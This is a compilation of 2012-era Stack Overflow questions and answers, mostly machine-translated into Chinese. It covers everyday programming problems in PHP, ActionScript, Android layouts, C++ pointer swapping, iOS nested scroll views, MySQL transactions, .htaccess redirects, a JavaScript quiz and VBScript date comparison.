我有一个像这样的视图（category.html），例如：

```
<!DOCTYPE html> 
<html> 
    <head> 
        <title></title> 
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
    </head> 
    <body> 
        <div>{{category.categoryname}}</div> 
    </body> 
</html>` 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T06:53:35.697

这样做的最东方式是：

```
class CategoryController extends DooController { 
    public function Index(){ 
        Doo::loadModel('Category'); 
        $category = new Category; 
        Doo::db()->find( $category, array('limit'=>1) ); 
        $this->view()->renderc('Category/Index', array("category" => $category)); 
    } 
} 
```

然后是 category.php

```
<!DOCTYPE html> 
<html> 
    <head> 
        <title></title> 
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
    </head> 
    <body> 
        <div><?php echo $this->data['category']->categoryname; ?></div> 
    </body> 
</html>` 
```

# actionscript-3 - as3 灯闪烁的代码？

> ID：13221468
> 
> 赞同：0
> 
> 时间：2012-11-04T18:21:26.247
> 
> 标签：actionscript-3, flash, timer

我正在尝试制作一个游戏，人们必须识别灯塔，然后将一个符号拖到它上面。我的拖放代码很好，但我想知道为我的灯塔设置动画的最佳方式是什么。我有一个名为 lightFlash 的单独电影剪辑，我正在尝试计时，它只会放在灯塔旁边。我正在尝试使用计时器使其闪​​烁。我想要的是等待 3 秒，闪烁一秒，然后等待 3 秒等。这是我到目前为止所拥有的，不是很多，所以任何帮助将不胜感激！

```
lightFlash.alpha=0;
var myTimer:Timer = new Timer(3000);
myTimer.addEventListener(TimerEvent.TIMER, timerListener);
function timerListener(e:TimerEvent):void {
lightFlash.alpha=1;
//wait for one second
}
myTimer.start(); 
```

我已经看到我会遇到一个问题，如果我这样做，每次我都会失去一秒钟的计时器，可能有更好的方法我应该这样做，任何帮助将不胜感激，谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T18:42:10.750

尝试

```
var isOn:Boolean;

lightFlash.alpha=0;
var myTimer:Timer = new Timer(3000);
myTimer.addEventListener(TimerEvent.TIMER, timerListener);
myTimer.start();

function timerListener(e:TimerEvent):void {
   isOn = !isOn;
   if (isOn) {
      lightFlash.alpha=1;

     //wait for one second
     myTimer.delay = 1000;
   } else {
      lightFlash.alpha = 0;
      myTimer.delay = 3000;
     //wait for three seconds
   }
} 
```

# android - 可变父大小的应用小部件 xml 布局

> ID：13221469
> 
> 赞同：0
> 
> 时间：2012-11-04T18:21:32.020
> 
> 标签：android, xml, android-linearlayout, android-relativelayout

我有一个可调整大小的应用小部件。我想在图像上方和下方放置文字。图像应占用尽可能多的空间，文本应直接位于图像的上方和下方。

我只想在 xml 中执行此操作，但无法找出适用于附件图像中显示的两种情况的布局。

所以我的问题是，我可以用什么 XML 来实现这种行为？

编辑：图像视图可能大于父容器视图。

![所需的布局行为](../Images/5da07d571a4f281bc62b01d452c0227d.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:40:36.570

像这样的东西：

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="wrap_content" >

    <ImageView
        android:id="@+id/imageview"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:scaleType="center"
        android:layout_alignParentCenter="true"/>

    <TextView
        android:id="@+id/textView1"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_above="@id/imageview"
        android:text="text 1"/>

    <TextView
        android:id="@+id/textView2"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_below="@id/imageview"
        android:text="text 2"/>

</RelativeLayout> 
```

或者这样，使用布局权重来控制大小：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:weightSum="100"
    android:orientation="vertical"
    android:layout_width="match_parent"
    android:layout_height="wrap_content" >

    <TextView
        android:id="@+id/textView1"
        android:layout_width="match_parent"
        android:layout_weight="10"
        android:layout_height="0px"
        android:text="text 1"/>

   <ImageView
        android:id="@+id/imageview"
        android:layout_width="wrap_content"
        android:layout_weight="80"
        android:layout_height="0px"
        android:scaleType="center"
        android:layout_alignParentCenter="true"/>

    <TextView
        android:id="@+id/textView2"
        android:layout_width="match_parent"
        android:layout_weight="10"
        android:layout_height="0px"
        android:text="text 2"/>

 </LinearLayout> 
```

使用权重、图像对齐和图像比例类型来获得你想要的。

# ios - 在 iPad 上运行 iPhone 图像选择器应用程序的奇怪问题

> ID：13221470
> 
> 赞同：1
> 
> 时间：2012-11-04T18:21:36.420
> 
> 标签：ios, iphone, ipad, photo

这是我在 iPad 上运行 iPhone 应用时遇到的一个奇怪问题。在这个应用程序中，我有一个 ABPersonViewController 子类，以便对其进行样式设置。当用户在 iPad 上访问此屏幕并尝试为联系人添加新照片时，他们会看到一个模态显示的照片选择器。这个是正常的。

但是一旦他们选择了一张照片，另一个屏幕会被推送到照片选择器的导航堆栈上，只有图像，“移动和缩放”作为标题，然后取消并选择底部附近的文本。

这是在 iPad 上运行 iPhone 应用程序的错误吗？因为我知道您需要在 iPad 上的 popoverController 中显示照片选择器。

当我尝试使用本机联系人应用程序执行相同操作时，移动和缩放屏幕显示在弹出框内。还有人遇到这个吗？

# c++ - 交换指针到指针

> ID：13221473
> 
> 赞同：2
> 
> 时间：2012-11-04T18:21:58.780
> 
> 标签：c++

在我正在编写的这个程序中，我使用了 2 个声明为指针指针的矩阵。最初，矩阵 B 等于矩阵 A，并且对矩阵 B 进行了所有更改（我不需要修改 A 中的值，因为我正在使用这些值来计算其他内容，如果我直接修改它，我实际上得到了错误的结果）。最后，我需要交换两个矩阵中的值。我的程序已经在运行和编译，但是要交换我使用过的矩阵

```
for(i=0;i<n;++i)
    for(j=0;j<n;++j)
        A[i][j]=B[i][j]; 
```

我知道这不是最好的方法，所以我想知道是否有办法通过指针交换我的矩阵。我已经尝试过自己做。但我是 C++ 编程的新手，我似乎无法做到正确:(。

这是我的代码草图：

```
void swap(int **A, int **B){
?
}

main (){
int **A, **B;
*code*
swap(A,B);
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-04T18:23:47.103

C++ already gives us [a `swap` function](http://en.cppreference.com/w/cpp/algorithm/swap):

```
int main()
{
   int** A;
   int** B;

   /* ... code ... */

   std::swap(A, B);   
} 
```

What it does in this particular case is basically this:

```
void swap(int**& lhs, int**& rhs)
{
   int** tmp;

   tmp = lhs;
   lhs = rhs;
   rhs = tmp;
} 
```

Or, with pointers instead of references:

```
void swap(int*** lhs, int*** rhs)
{
   int** tmp;

   tmp = *lhs;
   *lhs = *rhs;
   *rhs = tmp;
} 
```

With this last one, you'd call `swap(&A, &B)` (note the `&`).

That said, why all these pointers? You're in C++. Use containers.

*At the very least* consider using real arrays, because I have serious doubts that the type `int**` is doing what you think it's doing.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T18:42:40.433

看起来这对我来说是一个过滤或管道类型的操作，所以我建议只是交换指针而不是移动每个元素。

您将需要一个中间指针来进行交换，但由于它只是一个指针，因此与矩阵的大小相比，这是一个固定的存储量，因此如果数据集足够大，它应该比复制快得多。

```
int **A,**B,**tmp;
tmp = A;
A=B;
B=tmp; 
```

如上所述，结构或其他容器可能很有用，尤其是当您进行任何动态内存分配并需要释放它以避免内存泄漏时。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T18:58:49.023

从您的问题的详细描述来看，“交换”似乎并没有真正传达您想要的内容 - 您的 for 循环将值分配`B`给`A`. 您显然愿意丢弃`A`. 下一个问题是：你愿意丢弃 的存储`A`吗？如果是这样，它很简单

```
// Don't forget to deallocate A first, as appropriate to however you allocated A.
A = B; 
```

但是，如果您想重复执行您的算法，您可能希望保留存储空间而不是破坏免费存储空间。如果您希望下一次迭代从上一次迭代的输出开始（即您希望 A 和 B 都保存您刚刚计算的矩阵），那么您的 for 循环将与您合理预期的一样快。

如果您希望重新开始使用新数据，那么`std::swap(A,B)`这就是您想要的。`#include <algorithm>`访问它。

# sql - 在这种情况下，Redis 是一个不错的选择吗？

> ID：13221475
> 
> 赞同：0
> 
> 时间：2012-11-04T18:22:19.183
> 
> 标签：sql, email, redis

该公司仅在 2 小时内（即从凌晨 1 点到凌晨 3 点）向成千上万的用户发送电子邮件（数千封），有些天甚至更少，在夜间。后来它停止了，什么也不做；第二天，我们使用相同的流程，但在这些电子邮件中添加了新数据。

我们发送它们的过程是这样的：

1.  从 SQL 数据库获取电子邮件的内容数据/个人信息

2.  使用 Redis 在内存中构建包含这些内容数据/个人信息的队列

3.  发送电子邮件，从内存 Redis 中获取内容数据/个人信息

4.  删除内存 Redis 中的所有 content-data/personal-information。

问题是我不确定 Redis 在这种情况下是否是一个不错的选择。它正在工作，但我认为只有两个小时没有必要使用 Redis。我是公司的新人，所以我没有建立它，但我不明白他们为什么要这样。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-02-24T18:26:28.717

几点注意事项：

1.  如果您每天访问一次内容和个人数据，您可以轻松地从关系数据库中获取。

2.  Redis 在缓存方面非常棒。您可以根据键请求数据。我们在开发中使用 Redis 来加速“查询”、访问常用数据、缓存和承担关系数据库的负载。

3.  出于责任原因，如果您想保留发送电子邮件的日志，您将需要回写到中央数据库，因为您在完成后清除 Redis 缓存。

据我了解，Redis 只是您整个过程中的另一个步骤，这似乎是不必要的。

# html - Different HTML markup in Chrome, missing "<" of closing tag for one pre element only

> ID：13221479
> 
> 赞同：1
> 
> 时间：2012-11-04T18:22:35.317
> 
> 标签：html, google-chrome, browser, pre

This is an extremely peculiar problem that is breaking a website of ours. In Google Chrome, there is a single pre closing tag that incorrectly looks like this: /pre> instead of . You can see it at about line 288 of the source code.

The website has been up for a year now without any code changes and has recently been broken by unknown forces (aren't they always?) but only in Google Chrome browser. The website was thoroughly tested on the then current version of Chrome and performed swell, however the website is now broken not only in the current Google Chrome, but past Google Chrome versions as well (making a Chrome bug unlikely). The page is being parsed on the server by PHP v5.3.8 and the particular markup comes from a straight forward, logic-less bit of code:

```
 $markup = '';

    foreach($albums AS $album) {
        foreach ($album->videos AS $video) {
            $markup .= '
                    <pre class="video '.$video->id.'">'.$video->url.'</pre>';
        }
    }

    return $markup; 
```

If I echo $markup before it's returned and exit the script before returning $markup, in Chrome I'll see the that last line (same markup from line 288) having a malformed pre closing tag.

```
 <pre class="video Woman_v_Workout-FDNY_Training">http://player.vimeo.com/video/41377883</pre>
                    <pre class="video 30_Second_Fitness_Intro-2812">http://player.vimeo.com/video/36457857</pre>
                    <pre class="video Off_the_Beaten_Palate-FoodTravel_Show">http://player.vimeo.com/video/13491373</pre>
                    <pre class="video Make_Up_For_Ever-Blush_Product_Demo">http://player.vimeo.com/video/16980727</pre>
                    <pre class="video Karlssons_Vodka">http://player.vimeo.com/video/34921497</pre>
                    <pre class="video Sage_Spoonfuls">http://player.vimeo.com/video/25146823</pre>
                    <pre class="video iPhone_App_Commercial">http://player.vimeo.com/video/17769191</pre>
                    <pre class="video A_Taste_of_North_Vietnam">http://player.vimeo.com/video/44951293</pre>
                    <pre class="video Aid_for_AIDS_Commercial">http://player.vimeo.com/video/23805118</pre>
                    <pre class="video YPO-WPO_NE_Regional_Conference-31212">http://player.vimeo.com/video/38386105</pre>
                    <pre class="video LonelyGirl48">http://player.vimeo.com/video/13659996</pre>
                    <pre class="video Malibu_Rum-Stickies">http://player.vimeo.com/video/16980262/pre> 
```

However, If I echo the lines as they go, the offending line prints as expected.

Website can be found here: [http://www.oneglassproductions.com](http://www.oneglassproductions.com) All ideas appreciated, I'll be tinkering with it on the production site because the same code base functions properly on other servers. PHP configuration?

EDIT: Thanks to Martin, Adding a space just before the pre closing tag made the closing tag print properly and even now that I've reverted the code to without a space, the closing tag is printing properly (even though the code is identical to when we saw the problem). Still would like to know what might be going on.

# cocos2d-iphone - 有没有办法获取 CCSprite 相对于另一个父级的 x,y 位置？

> ID：13221486
> 
> 赞同：0
> 
> 时间：2012-11-04T18:24:19.307
> 
> 标签：cocos2d-iphone

如果我有两层... A 层和 B 层。它们有不同的锚点，因此坐标 (100, 100) 将位于两个完全不同的位置...

如何将 A 层上的精灵设置为相对于 B 层？

换句话说，如果我要将精灵添加到 B 层，我会知道我希望位置是 (123, 456).. 但是在 A 层，(123, 456) 是错误的--- 那么如何我可以找出 A 中的 B (123, 456) 是什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T20:39:54.070

使用以下方法先将坐标转换为世界空间，然后再转换回目标节点空间：

```
- (CGPoint)convertToNodeSpace:(CGPoint)worldPoint; 
```

/** 将点转换为世界空间坐标。结果以点为单位。@自 v0.7.1 */

```
 - (CGPoint)convertToWorldSpace:(CGPoint)nodePoint; 
```

/** 将点转换为节点（本地）空间坐标。结果以点为单位。将返回/接收的节点点视为相对锚点。

# java - Reference another project from a dynamic web project without converting it to a faceted project

> ID：13221487
> 
> 赞同：1
> 
> 时间：2012-11-04T18:24:26.403
> 
> 标签：java, eclipse, build

In eclipse I am trying to reference a plain Java project (let's call it "Common") from a Dynamic Web Project ("Server").

While "Server" is a faceted project and targets the Glassfish runtime, "Common" should stay a plain Java project (and not be faceted).

In "Server", I added a reference to "Common" using the "Project References" in the project properties. On deployment, however, the classes in "Common" cannot be found (`NoClassDefFoundError`).

This problem can be solved adding the "Common" project to the Deployment Assembly of "Server".

However, this action causes Eclipse to change the type of the "Common" project to a faceted project and let it target the Glassfish Runtime, too.
This then causes problems for team memebers who don't have GlassFish installed but still want to be able to build the "Common" project as it is used by another project, too.

How am I able to reference a plain Java project from my Server project (and add it to the deployment assembly) while keeping the referenced project's runtime and type unchanged?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-03T13:43:30.170

[此处](https://stackoverflow.com/questions/4646684/set-up-an-eclipse-dynamic-web-project-referencing-another-project/4648520#4648520)已回答了类似的问题。

> 部署中的内容不是由构建路径决定，而是由动态 Web 项目的首选项中的部署程序集条目决定。

# objective-c - UIScrollView中的UIScrollView，如何在两者之间滚动时保持平滑过渡

> ID：13221488
> 
> 赞同：7
> 
> 时间：2012-11-04T18:24:54.187
> 
> 标签：objective-c, ios, uitableview, uiscrollview

我有以下布局（见下文），在大多数情况下都可以正常工作。用户可以在蓝色范围内滚动`UIScrollView`（出于所有意图和目的，它是 a `UITableView`，但这个问题概括了这一点），然后当他们到达此滚动视图的末尾时，他们可以再次开始滚动（他们必须采取他们的手指关闭，然后再次打开，因为内部滚动视图橡皮筋，否则），“超级”滚动视图开始滚动，显示图像的其余部分。

这是我不想要的全部*（他们必须松开手指，然后再次打开，因为内部滚动视图会橡皮筋） 。*理想情况下，一旦包含`UIScrollView`的内容到达其内容的末尾，我希望超级视图立即接管滚动，以便内部滚动视图不会橡皮筋。

当用户向上滚动时也是如此；当红色滚动视图到达其内容的顶部时，我希望内部蓝色滚动视图立即开始向上滚动，而不是顶部的红色滚动视图橡皮筋。

![屏幕布局； UIScrollView + UIImageView 在 UIScrollView](../Images/6e4aa83bebe98addeb5a002f5a8c57a9.png)

知道怎么做吗？我能够确定滚动视图何时到达其内容的末尾，但我不确定如何应用这些知识来达到我想要的效果。谢谢。

```
// Inner (blue) scroll view bounds checking
if (scrollView.contentOffset.y + scrollView.frame.size.height > scrollView.contentSize.height) { ... }

// Outer (red) scroll view bounds checking
if (scrollView.contentOffset.y < 0) { ... } 
```

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-11-04T19:34:30.680

是的。我为你准备了一个绝妙的技巧。

与其让你的红色轮廓视图成为一个滚动视图，不如让它成为一个填充屏幕的普通 UIView。在该视图中布置您的滚动视图（表格视图）和图像视图，就像它们在您的插图中一样。

在所有其他滚动视图和图像视图上方放置一个填充根视图边界（即也填充屏幕）的滚动视图。将此视图的内容大小设置为要滚动的所有视图的总内容高度。换句话说，在所有其他视图之上有一个不可见的滚动视图，其内容大小高度是内部滚动视图（表格视图）内容大小高度 + 图像视图大小高度。

层次结构应如下所示：

![在此处输入图像描述](../Images/e801408d7e18cb280bb77ebf2e6819c1.png)

然后，您使用非常高的内容大小制作的顶部滚动视图使其代表成为您的视图控制器。实施`scrollViewDidScroll`，我们将发挥一些作用。

Scrollviews 基本上是通过使用时髦的动量公式调整边界原点来滚动的。所以在我们的`scrollviewDidScroll`方法中，我们将简单地调整底层视图的边界：

```
-(void)scrollViewDidScroll:(UIScrollView *)scrollView{

    //the scroll view underneath (in the container view) will have a max content offset equal to the content height
    //but minus the bounds height
    CGFloat maxYOffsetForUnderScrollView = self.underScrollView.contentSize.height - self.underScrollView.bounds.size.height;

    CGRect scrolledBoundsForContainerView = self.view.bounds;

    if (scrollView.contentOffset.y <= maxYOffsetForUnderScrollView) {
        //in this scenario we are still within the content for the underScrollView
        //so we make sure the container view is scrolled to the top and set the offset for the contained scrollview
        self.containerView.bounds = scrolledBoundsForContainerView;
        self.underScrollview.contentOffset = scrollView.contentOffset;
        return;
    }

    //in this scenario we have scrolled throug the entirety of the contained scrollview
    //set its offset to the max and change the bounds of the container view to scroll everything else.
    self.underScrollView.contentOffset = CGPointMake(0, maxYOffsetForUnderScrollView);

    scrolledBoundsForContainerView.origin.y = scrollView.contentOffset.y - maxYOffsetForUnderScrollView;
    self.containerView.bounds = scrolledBoundsForContainerView;
} 
```

你会发现，当每一帧动画都调用 scrollViewDidScroll 时，包含视图的这种虚假滚动看起来非常自然。

可是等等！我听你说。顶部的滚动视图现在拦截所有触摸，并且它下面的视图也需要被触摸。我对此也有一个有趣的解决方案。

将顶部的滚动视图设置为在屏幕外某处（即，将其框架设置为屏幕外，但大小仍然相同。）然后在您的`viewDidLoad`方法中将滚动视图添加`panGestureRecogniser`到主视图中。这意味着您无需在屏幕上实际看到视图即可获得所有 iOS 自然滚动动力和内容。包含的滚动视图现在可能会变得不稳定，因为它的平移手势识别器也会被调用（它们的工作方式与 UIEvent 处理不同），因此您需要将其删除。

```
- (void)viewDidLoad
{
    [super viewDidLoad];
    // Do any additional setup after loading the view, typically from a nib.

    [self.view addGestureRecognizer:self.scrollview.panGestureRecognizer];

    [self.underScrollview removeGestureRecognizer:self.underScrollView.panGestureRecognizer];

    //further code to set up content sizes and stuff
} 
```

我玩得很开心，所以这里有一个指向 github 上示例项目的链接： [https ://github.com/joelparsons/multipleScrollers](https://github.com/joelparsons/multipleScrollers)

编辑：

要在顶部滚动视图离开屏幕时显示滚动条，无论您将它放在哪里，您都可以将其设置为`scrollIndicatorInsets`这样创建的插图：

```
CGPoint scrollviewOrigin = self.scrollview.frame.origin;
self.scrollview.scrollIndicatorInsets = UIEdgeInsetsMake(-scrollviewOrigin.y,0,scrollviewOrigin.y,scrollviewOrigin.x); 
```

*警告滚动视图仍然必须是正确的高度，但我相信你明白了。

然后要使栏在滚动视图的可见边界之外绘制，您必须关闭剪辑到边界

```
self.scrollview.clipsToBounds = NO; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-08-19T10:16:18.313

我的天啊。jackslash，你救了我的命。

就我而言，我需要使用三个深度的滚动视图。

1.  父滚动视图
    *   作为孩子之一具有滚动视图
2.  子滚动视图：在下图中显示为“说明滚动视图/查看表视图/信息滚动视图”）
3.  隐藏的滚动视图
    *   将自己的内容偏移量分配给“父滚动视图”和“子滚动视图”
    *   它具有整个展平内容的内容大小

[视图层次结构的屏幕截图](https://i.stack.imgur.com/jsMee.png)

设置视图层次结构后，我只需要同步整个展平内容大小并正确分配内容偏移量。

```
 Observable.combineLatest(
        overviewStackView.rx.observe(CGRect.self, #keyPath(UIStackView.frame)).unwrap(),
        explanationScrollView.rx.observe(CGSize.self, #keyPath(UIScrollView.contentSize)).unwrap()
      )
      .subscribe(onNext: { [weak self] overviewStackViewFrame, explanationScrollViewContentSize in
        guard let self = self else { return }
        let totalContentHeight = overviewStackViewFrame.height + self.segmentedControl.frame.height + explanationScrollViewContentSize.height
        self.hiddenScrollView.contentSize.height = totalContentHeight
      })
      .disposed(by: disposeBag)

    hiddenScrollView.rx.didScroll
      .subscribe(onNext: { [weak self] _ in
        guard let self = self else { return }
        let currentHiddenScrollViewOffsetY = self.hiddenScrollView.contentOffset.y
        let parentScrollViewMaxOffsetY = self.overviewStackView.frame.height
        let expectedChildScrollViewOffsetY = max(currentHiddenScrollViewOffsetY - parentScrollViewMaxOffsetY, 0)
        self.parentScrollView.contentOffset.y = min(parentScrollViewMaxOffsetY, currentHiddenScrollViewOffsetY)
        self.explanationScrollView.contentOffset.y = expectedChildScrollViewOffsetY
      })
      .disposed(by: disposeBag) 
```

# mysql - mysql（InnoDB）在事务内部插入和更新是否比外部更快

> ID：13221493
> 
> 赞同：0
> 
> 时间：2012-11-04T18:25:10.240
> 
> 标签：mysql, innodb

基本上，问题是：

在使用 InnoDB 的默认 MySQL 配置中，在事务中插入和更新比在两个单独事务中的相同操作更快。

我的假设是在交易中它应该更快，但是如果有人可以举例说明它是否真的更快以及为什么会更好。

我相信答案取决于工作量，因此在哪些情况下单个事务应该更快，在哪些情况下两个事务应该更快。

使用哪个 MySQL 版本是否重要？有什么影响这个的选择吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T18:39:26.300

对于这个简单的案例，我会说它更快。当大事务中的操作数量很大时，它可能会变慢。

它还取决于配置。在 5.5 和更早版本中，将[innodb_flush_log_at_trx_commit](http://dev.mysql.com/doc/refman/5.5/en/innodb-parameters.html#sysvar_innodb_flush_log_at_trx_commit)保留为默认值 1 会对每个事务造成真正的惩罚，并且在事务之外执行插入 + 更新实际会导致两个单独的事务和两个单独的刷新记录。在 5.6 中，这更快。

# .htaccess - 多个页面的重定向规则

> ID：13221495
> 
> 赞同：1
> 
> 时间：2012-11-04T18:25:29.663
> 
> 标签：.htaccess, drupal, redirect

我在网站管理员中有页面未找到错误，因为 url 的 page/2/0 部分是由于智能分页模块清理 url 功能（Drupal）现在我卸载了智能分页模块但这些页面未找到错误仍然存​​在。

```
www.mysite.com/a/b/c/page/2/0, 
www.mysite.com/a/d/e/page/3/0, 
www.mysite.com/a/f/g/page/4/0, 
www.mysite.com/a/h/i/page/5/0 
```

等等。

我想重定向

```
www.mysite.com/a/b/c/page/2/0 to  www.mysite.com/a/b/c
www.mysite.com/a/d/e/page/3/0, to www.mysite.com/a/d/e
www.mysite.com/a/f/g/page/4/0, to www.mysite.com/a/f/g
www.mysite.com/a/h/i/page/5/0  to www.mysite.com/a/h/i 
```

使用一个重定向规则。这个怎么做

简而言之，我想从 url 中删除 page/x/0 部分并将其重定向到该 url 的其余部分。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-05T04:49:02.343

你想要这样的东西：

```
RewriteEngine On
RewriteRule ^/?([^/]+)/([^/]+)/([^/]+)/page/[0-9]+/0$ /$1/$2/$3 [L,R=301] 
```

这里的文字在前 3 个路径节点之后：`/anything/anything/anything/`，然后*必须*跟一个`page`，然后是一些数字，然后*是零*。您可以通过将模式更改为：

```
RewriteEngine On
RewriteRule ^/?([^/]+)/([^/]+)/([^/]+)/page/ /$1/$2/$3 [L,R=301] 
```

# javascript - 带有单选按钮的 JavaScript 表单

> ID：13221500
> 
> 赞同：1
> 
> 时间：2012-11-04T18:26:05.820
> 
> 标签：javascript, html, forms, radio-button

我正在尝试在 javascript 中进行测验，在其中我使用单选按钮检查提供给用户的答案。它检查第一个条目没问题，但是当它移动到第二个问题时，它会抛出一个未定义的类型错误`cannot read property of undefined`。在这条线上，我尝试过使用`getElementById`和使用 document.form，但无法弄清楚为什么会出现错误。该代码是第一个问题所用内容的复制和粘贴，效果很好！请帮忙！

```
var questionsChosen = new Array();
for (var i = 1;i<16 ;i++ )
{
    questionsChosen[i]= false;
}
function randomQuestion()
{
    var myQuestions = new Array();
    myQuestions[1] = "<tr><td><h4>Which one of these authors wrote and illustrated 'Calvin and Hobbes'?</h4></td></tr><tr><td><input type='radio' name='question1' value='Charles Schultz'>Charles Schultz<br><input type='radio' name='question1' id='correct' value='Bill Watterson'>Bill Watterson<br><input type='radio' name='question1' value='Jim Davis'>Jim Davis<br><input type='radio' name='question1' value='Tommy Peters'>Tommy Peters<br><hr/></td></tr>";

    myQuestions[2] = "<tr><td><h4>In the Calvin and Hobbes Comic, Who was Calvin's annoying neighbour?</h4></td></tr><tr><td><input type='radio' name='question2' id='correct' value='Susie Derkins'/>Susie Derkins<br><input type='radio' name='question2' value='Samantha Jones'/>Samantha Jones<br><input type='radio' name='question2' value='Sally Parker'/>Sally Parker<br><input type='radio' name='question2' value='Sarah Marsh'/>Sarah Marsh<br><hr/></td></tr>";

    for (var k = 1;k<myQuestions.length ;k++ )
    {
        document.write(myQuestions[k]);
        questionsChosen[i]= true;
    }
}

function checkAnswers()
{
    // use boolean to set whether a question has been asked or not. if it has then check here 
    // maybe something like if question1==true
    if (questionsChosen[1]= true)
    {
        var correctAnswer = document.myQuiz.question1[1].value;
        var userAnswer;
        for (i=0; i<document.myQuiz.question1.length; i++) 
        {
            if (document.myQuiz.question1[i].checked==true)
            {
                userAnswer =document.myQuiz.question1[i].value
            }
        }
        document.write("<br><br>Which one of these authors wrote and illustrated 'Calvin and Hobbes'?");
        document.write("<br>Your chosen answer is: "+userAnswer);
        if (correctAnswer == userAnswer)
        {
            document.write("<br>Correct!");
        }
        else document.write("<br>Incorrect... The answer was "+ correctAnswer);
    }

    if (questionsChosen[2]= true)
    {
        var correctAnswer = document.myQuiz.question2.value;
        var userAnswer;
        for (i=0; i<document.myQuiz.question2.length; i++) 
        {
            if (document.myQuiz.question2[i].checked==true)
            {
                userAnswer =document.myQuiz.question2[i].value
            }
        }
        document.write("<br><br>In the Calvin and Hobbes Comic, Who was Calvin's annoying neighbour?");
        document.write("<br>Your chosen answer is: "+userAnswer);
        if (correctAnswer == userAnswer)
        {
            document.write("<br>Correct!");
        }
        else document.write("<br>Incorrect... The answer was "+ correctAnswer);
    }
} 
```

`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T18:54:50.947

If question2 is also an array like question1 you must state the index of the array whose value you would like to retrieve and set as the correct answer. question2 is the array itself. An array cannot have a value, but its elements have values. So it must read question2[1].value, or something like that.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-05T05:16:29.017

我已经尝试了下面的代码，它工作得很好。

```
<html><head></head><body>
    <script>
    var questionsChosen = new Array();
    for (var i = 1;i<16 ;i++ )
    {
        questionsChosen[i]= false;
    }
    function randomQuestion()
    {
        var myQuestions = new Array();
        myQuestions[1] = "<tr><td><h4>Which one of these authors wrote and illustrated 'Calvin and Hobbes'?</h4></td></tr><tr><td><input type='radio' name='question1' value='Charles Schultz'>Charles Schultz<br><input type='radio' name='question1' id='correct' value='Bill Watterson'>Bill Watterson<br><input type='radio' name='question1' value='Jim Davis'>Jim Davis<br><input type='radio' name='question1' value='Tommy Peters'>Tommy Peters<br><hr/></td></tr>";

        myQuestions[2] = "<tr><td><h4>In the Calvin and Hobbes Comic, Who was Calvin's annoying neighbour?</h4></td></tr><tr><td><input type='radio' name='question2' id='correct' value='Susie Derkins'/>Susie Derkins<br><input type='radio' name='question2' value='Samantha Jones'/>Samantha Jones<br><input type='radio' name='question2' value='Sally Parker'/>Sally Parker<br><input type='radio' name='question2' value='Sarah Marsh'/>Sarah Marsh<br><hr/></td></tr>";

        for (var k = 1;k<myQuestions.length ;k++ )
        {
            document.write(myQuestions[k]);
            questionsChosen[i]= true;
        }
        document.write("<a href='Javascript:void(0)' onclick='checkAnswers();'>Check Answers</a>");
    }

    function checkAnswers()
    {
        // use boolean to set whether a question has been asked or not. if it has then check here 
        // maybe something like if question1==true
        if (questionsChosen[1]= true)
        {
            var correctAnswer = document.myQuiz.question1[1].value;
            var userAnswer;
            for (i=0; i<document.myQuiz.question1.length; i++) 
            {
                if (document.myQuiz.question1[i].checked==true)
                {
                    userAnswer =document.myQuiz.question1[i].value
                }
            }
            document.write("<br><br>Which one of these authors wrote and illustrated 'Calvin and Hobbes'?");
            document.write("<br>Your chosen answer is: "+userAnswer);
            if (correctAnswer == userAnswer)
            {
                document.write("<br>Correct!");
            }
            else document.write("<br>Incorrect... The answer was "+ correctAnswer);
        }

        if (questionsChosen[2]= true)
        {
            var correctAnswer = document.myQuiz.question2[1].value;
            var userAnswer;
            for (i=0; i<document.myQuiz.question2.length; i++) 
            {
                if (document.myQuiz.question2[i].checked==true)
                {
                    userAnswer =document.myQuiz.question2[i].value
                }
            }
            document.write("<br><br>In the Calvin and Hobbes Comic, Who was Calvin's annoying neighbour?");
            document.write("<br>Your chosen answer is: "+userAnswer);
            if (correctAnswer == userAnswer)
            {
                document.write("<br>Correct!");
            }
            else document.write("<br>Incorrect... The answer was "+ correctAnswer);
        }
    }

    </script>
    <form name='myQuiz'>
        <script>
            randomQuestion();
        </script>

    </form>
    </body></html> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T18:56:47.353

请将该行更改`var correctAnswer = document.myQuiz.question2.value;`为

```
var correctAnswer = document.myQuiz.question2[1].value; 
```

放1,2,3,4水是正确答案

# vbscript - DateDiff vbscript to find current date files

> ID：13221504
> 
> 赞同：0
> 
> 时间：2012-11-04T18:26:26.897
> 
> 标签：vbscript

I need vbscript to iterate files through files and find all files which are created today.

```
DateDiff("d",RFile.DateLastModified ,Date)=0 
```

I can see there are 40 files in the folder for today but when the script scans though all files, it lists files less than 40\. Maybe it is also looking at the time portion.

Can anyone tell me exactly how to use the `datediff` function so that I can achieve the desired.

I want it to get all files whose DATE portion is today's date portion without any consideration for the time portion.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T21:10:01.990

